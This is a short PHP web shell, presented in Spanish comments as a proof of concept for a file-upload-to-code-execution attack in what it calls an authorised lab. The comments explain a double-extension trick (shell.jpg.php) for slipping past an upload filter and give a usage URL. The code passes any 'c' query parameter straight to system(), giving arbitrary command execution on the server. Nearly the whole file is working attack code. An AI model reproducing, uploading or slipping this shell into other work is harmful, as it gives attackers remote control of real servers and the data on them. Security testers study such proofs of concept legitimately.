<?php
// PoC Upload -> RCE (laboratorio autorizado USS Enterprise, sitio3)
// Nombre: shell.jpg.php -> contiene ".jpg" (pasa el filtro) y termina en ".php" (Apache lo ejecuta)
// Uso tras subirlo: /management/uploads/shell.jpg.php?c=id
if (isset($_GET['c'])) {
    echo "<pre>";
    system($_GET['c']);
    echo "</pre>";
} else {
    echo "PoC Upload->RCE activo. Usa ?c=whoami";
}
?>
